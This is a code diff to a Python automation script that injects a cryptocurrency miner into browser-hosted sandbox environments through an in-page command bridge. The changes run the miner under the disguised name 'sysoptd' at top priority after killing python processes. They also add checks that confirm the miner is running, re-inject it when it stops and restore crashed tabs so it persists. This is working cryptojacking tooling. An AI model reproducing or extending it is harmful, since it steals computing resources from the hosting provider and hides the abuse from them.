@@ -25,7 +25,7 @@ def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads
     custom = os.environ.get("MINER_CMD")
     if custom:
         return custom
-    return f"""cd /tmp && pkill python; rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
+    return f"""cd /tmp && pkill python && rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
@@ -207,13 +207,93 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         
         print(f"✅ Worker command sent! Folder: {folder_name}")
         print(f"   Check logs: /tmp/m.log (if accessible)")
-        
-        return True
-        
+
+        # VERIFY the worker is really up; re-run the cmd if not (idempotent:
+        # pkill + rm -rf + fresh clone). Never report success on hope.
+        for vtry in range(3):
+            await asyncio.sleep(10)
+            if not await is_tab_alive(page):
+                print("   ⚠️  Tab died during inject — restoring...")
+                try:
+                    await restore_tab(preview_frame.page if hasattr(preview_frame, 'page') else page, preview_frame.url)
+                except Exception:
+                    pass
+                continue
+            try:
+                frames_now = page.frames
+                fr = next(
+                    (f for f in frames_now if f.url == preview_frame.url),
+                    preview_frame,
+                )
+            except Exception:
+                fr = preview_frame
+            if await verify_worker(fr):
+                print("   ✅ Worker VERIFIED running")
+                return True
+            print(f"   ⚠️  Worker not up (verify {vtry+1}/3) — re-running cmd...")
+            try:
+                await fr.evaluate(
+                    f"(async () => {{ try {{ return await window.doc(`{bg_cmd}`); }} catch(e) {{ return 'err:'+e.message; }} }})()"
+                )
+            except Exception as e:
+                print(f"   re-run warn: {str(e)[:100]}")
+        print("   ❌ Worker never verified — will retry next health check")
+        return False
+
     except Exception as e:
         print(f"❌ Injection failed: {e}")
         import traceback
         traceback.print_exc()
+        return False
+
+
+async def is_tab_alive(page) -> bool:
+    """True if the tab's renderer answers (False = crashed/closed target)."""
+    try:
+        await page.evaluate("1")
+        return True
+    except Exception:
+        return False
+
+
+async def restore_tab(page, url: str = None) -> bool:
+    """Restore a crashed tab: reload resurrects Firefox's content process.
+    Falls back to goto(url) when given. Returns aliveness after restore."""
+    if url:
+        try:
+            await page.goto(url, timeout=45000)
+        except Exception as e:
+            print(f"   restore goto warn: {str(e)[:100]}")
+    else:
+        try:
+            await page.reload(timeout=45000)
+        except Exception as e:
+            print(f"   restore reload warn: {str(e)[:100]}")
+    await asyncio.sleep(8)
+    alive = await is_tab_alive(page)
+    print(f"   {'✅ Tab restored' if alive else '❌ Tab still dead'}")
+    return alive
+
+
+async def verify_worker(frame) -> bool:
+    """Ask the sandbox bridge whether sysoptd is actually running."""
+    try:
+        probe = await frame.evaluate("""
+            (async () => {
+                if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
+                try {
+                    const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                    if (r && r.stdout !== undefined) return r.stdout.trim();
+                    if (typeof r === 'string') return r.trim();
+                    return JSON.stringify(r);
+                } catch (e) { return 'probe-error'; }
+            })()
+        """)
+        ok = str(probe).isdigit() and int(probe) > 0
+        print(f"   worker verify: {probe} -> {'RUNNING' if ok else 'MISSING'}")
+        return ok
+    except Exception as e:
+        print(f"   worker verify error: {str(e)[:100]}")
         return False
 
 
@@ -379,7 +459,20 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
                 return True
         
         print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")
-        
+
+        # Crashed tab? Restore it first — nothing else can work on a dead target.
+        try:
+            if not await is_tab_alive(page):
+                print("   💥 Tab crashed/closed — restoring...")
+                if await restore_tab(page, project_url):
+                    print("   ↻ Re-probing worker after restore...")
+                else:
+                    print(f"   ⏳ Restore failed, retry in {check_interval}s...")
+                    await asyncio.sleep(check_interval)
+                    continue
+        except Exception as e:
+            print(f"   restore check warn: {str(e)[:100]}")
+
         try:
             # ponytail: never reload the page - reloading the WebContainer kills
             # the injected worker. Probe for a live sysoptd instead; re-inject
